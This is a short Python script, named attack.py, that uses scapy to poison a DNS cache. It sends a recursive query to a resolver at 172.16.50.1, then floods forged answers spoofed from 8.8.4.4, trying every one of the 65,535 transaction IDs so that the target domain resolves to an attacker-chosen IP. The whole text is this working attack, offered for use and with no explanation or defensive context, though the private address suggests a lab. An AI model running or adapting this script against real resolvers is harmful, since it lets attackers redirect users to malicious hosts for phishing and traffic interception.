from scapy.all import *

if len(sys.argv) < 3:
        print("Usage: attack.py [target domain] [spoofed IP]")
        sys.exit()

hostname = sys.argv[1]
fake_ip = sys.argv[2]
cache_server_ip = "172.16.50.1"

cache_server_port = 53

i = IP(dst=cache_server_ip, src="8.8.4.4")
u = UDP(dport=cache_server_port, sport=53)
d = DNS(id=0, qr=1, qd=DNSQR(qname=hostname), qdcount=1, ancount=1, nscount=0, arcount=0, an=(DNSRR(rrname=DNSQR(qname=hostname).qname, type='A', ttl=3600, rdata=fake_ip)))
response = i / u / d
request = IP(dst=cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=hostname, qtype="A", qclass="IN"))
send(response, verbose=0)
send(request, verbose=0)
for x in range(0, 65535):
    response[DNS].id = x
    send(response, verbose=0)
